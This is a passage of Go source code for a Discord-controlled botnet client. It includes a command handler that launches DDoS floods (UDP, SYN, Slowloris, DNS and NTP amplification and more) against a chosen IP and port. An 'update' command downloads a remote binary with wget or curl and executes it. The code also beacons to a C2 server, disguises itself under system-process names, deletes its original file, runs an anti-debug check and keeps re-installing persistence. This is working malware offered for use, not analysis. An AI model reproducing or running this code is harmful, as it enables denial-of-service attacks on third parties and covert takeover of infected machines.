				fmt.Sprintf("%s  MIX      %s— All methods combined", aMag, aGray),
				fmt.Sprintf("%s  AUTO     %s— Auto perf-scaled (recommandé)", aGreen, aGray),
				fmt.Sprintf("%s\n  Usage: ddos <ip> <port> <sec> [METHOD] [workers]%s", aYellow, aReset),
			))
			return
		}
		if len(parts) >= 3 && strings.ToLower(parts[2]) == "stop" {
			ddosCancel()
			post(fmt.Sprintf("%s[✗] ATTACK STOPPED — %s%s", aRed, botID, aReset))
			return
		}
		if len(parts) < 5 {
			post(fmt.Sprintf("%sUsage: ddos <ip> <port> <sec> [METHOD] [workers]\nEx: !all ddos 1.2.3.4 80 60 BYPASS 200%s", aYellow, aReset))
			return
		}
		target := parts[2]
		port, duration, workers := 80, 30, 100
		fmt.Sscanf(parts[3], "%d", &port)
		fmt.Sscanf(parts[4], "%d", &duration)
		method := "UDP"
		if len(parts) > 5 { method = strings.ToUpper(parts[5]) }
		if len(parts) > 6 { fmt.Sscanf(parts[6], "%d", &workers) }

		// Auto-perf : ajuste les workers selon la charge
		effWorkers := autoWorkers(workers)

		ddosSetActive(true)
		post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s\n%s",
			banner("⚡ ATTACK LAUNCHED", aRed),
			kv("Target", fmt.Sprintf("%s:%d", target, port), aCyan),
			kv("Method", method, aRed),
			kv("Duration", fmt.Sprintf("%ds", duration), aYellow),
			kv("Workers", fmt.Sprintf("%d (req: %d)", effWorkers, workers), aGreen),
			kv("Bot", botID, aMag),
			aReset,
		))

		go func() {
			defer ddosSetActive(false)
			w := effWorkers
			switch method {
			case "UDP":       ddosUDP(target, port, duration, w)
			case "TCP":       ddosTCP(target, port, duration, w)
			case "HTTP":      ddosHTTP(target, port, duration, w)
			case "POST":      ddosHTTPPost(target, port, duration, w)
			case "HTTPS":     ddosHTTPS(target, port, duration, w)
			case "BYPASS":    ddosBypass(target, port, duration, w)
			case "SYN":       ddosSYN(target, port, duration)
			case "SLOWLORIS": ddosSlowloris(target, port, duration)
			case "RUDY":      ddosRUDY(target, port, duration)
			case "DNS":       ddosDNS(target, duration, w)
			case "NTP":       ddosNTP(target, duration, w)
			case "VSE":       ddosVSE(target, port, duration, w)
			case "MIX":       ddosMix(target, port, duration, w)
			case "AUTO":
				aw := autoWorkers(w)
				ddosMix(target, port, duration, aw)
			default:          ddosUDP(target, port, duration, w)
			}
			if ddosIsActive() {
				post(fmt.Sprintf("%s[✓] ATTACK DONE — %s → %s:%d (%ds)%s", aGreen, method, target, port, duration, aReset))
			}
		}()

	case "update":
		if len(parts) < 3 { return }
		url := parts[2]
		go func() {
			shell(fmt.Sprintf("wget -q --no-check-certificate %q -O /tmp/.upd 2>/dev/null || curl -fskL %q -o /tmp/.upd", url, url))
			shell("chmod +x /tmp/.upd && /tmp/.upd &")
			os.Exit(0)
		}()
		post(fmt.Sprintf("%s[↑] Updating %s...%s", aYellow, botID, aReset))

	case "help":
		post(fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s",
			banner("COMMANDS", aCyan),
			fmt.Sprintf("%s  shell <cmd>  %s— Execute shell command", aGreen, aGray),
			fmt.Sprintf("%s  info         %s— System information", aGreen, aGray),
			fmt.Sprintf("%s  persist      %s— Install persistence", aGreen, aGray),
			fmt.Sprintf("%s  ddos <args>  %s— Launch DDoS attack", aRed, aGray),
			fmt.Sprintf("%s  ddos methods %s— List attack methods", aRed, aGray),
			fmt.Sprintf("%s  update <url> %s— Update binary", aYellow, aGray),
			fmt.Sprintf("%s  kill         %s— Terminate bot%s", aRed, aGray, aReset),
		))
	}
}

// ─── Main ─────────────────────────────────────────────────────────────────────

// pingBeacon connecte furtivement au C2 beacon pour signaler que le bot est actif.
// C2 incrémente CVE Work à chaque connexion reçue.
func pingBeacon() {
	if _b == "" { return }
	conn, err := net.DialTimeout("tcp", _b, 5*time.Second)
	if err == nil { conn.Close() }
}

// sysNames : noms qui imitent des processus système légitimes
var sysNames = []string{
	"systemd-worker", "kworker", "syslogd", "ntpd", "crond",
	"udevd", "dnsmasq", "dropbear", "network-manager",
}

// selfHide copie le binaire sous un nom système et supprime l'original si différent.
func selfHide() string {
	self, err := os.Executable()
	if err != nil { return self }
	name := sysNames[time.Now().UnixNano()%int64(len(sysNames))]
	dirs := []string{"/usr/bin", "/bin", "/sbin", "/usr/local/bin", "/jffs/usr/bin", "/overlay/usr/bin", "/tmp"}
	for _, d := range dirs {
		dst := d + "/." + name
		out := shell(fmt.Sprintf("cp %q %q 2>/dev/null && chmod +x %q 2>/dev/null && echo ok", self, dst, dst))
		if out == "ok" {
			if self != dst {
				shell(fmt.Sprintf("rm -f %q 2>/dev/null", self))
			}
			return dst
		}
	}
	return self
}

func connectLoop(tokenStr string) {
	defer func() { recover() }()
	delay := 10 * time.Second
	announced := false
	for {
		s, err := discordgo.New("Bot " + tokenStr)
		if err != nil { time.Sleep(delay); continue }

		s.AddHandler(onMessage)
		s.Identify.Intents = discordgo.IntentsGuildMessages

		if err = s.Open(); err != nil {
			time.Sleep(delay)
			if delay < 5*time.Minute { delay *= 2 }
			continue
		}

		session = s
		delay = 30 * time.Second // reset backoff après succès

		priv := "user"
		if os.Getuid() == 0 { priv = "ROOT" }
		if !announced {
			s.ChannelMessageSend(chanID, fmt.Sprintf(
				"```ansi\n%s[+] NEW BOT ONLINE%s\n%s\n%s\n%s\n```",
				aGreen, aReset,
				kv("ID", botID, aMag),
				kv("Arch", runtime.GOARCH+"/"+runtime.GOOS, aCyan),
				kv("Priv", priv, map[bool]string{true: aRed, false: aYellow}[os.Getuid()==0]),
			))
			announced = true
		} else {
			s.ChannelMessageSend(chanID, fmt.Sprintf("```ansi\n%s[~] %s reconnected%s\n```", aYellow, botID, aReset))
		}

		// Attendre la déconnexion — sort dès que DataReady passe à false
		for s.DataReady {
			time.Sleep(20 * time.Second)
		}
		s.Close()
	}
}

func main() {
	guardCheck() // anti-debug/anti-trace dès le premier instant

	go pingBeacon()

	// Auto-dissimulation — recover() pour éviter un panic si /proc/self/exe
	// n'est pas accessible (environnements restreints, émulateurs).
	func() {
		defer func() { recover() }()
		selfHide()
	}()

	botID = makeID()

	creds := recoverCreds()
	if creds == nil { os.Exit(1) }
	tokenStr := creds[0]
	chanID    = creds[1]
	// creds[2] = guild ID (disponible si besoin slash commands)
	runtime.GC()

	// Persistance initiale au démarrage
	go func() { defer func() { recover() }(); persist() }()

	// Watchdog interne : réinstalle la persistance toutes les 3 min
	go func() {
		defer func() { recover() }()
		for {
			time.Sleep(3 * time.Minute)
			func() { defer func() { recover() }(); persist() }()
		}
	}()

	connectLoop(tokenStr)
}
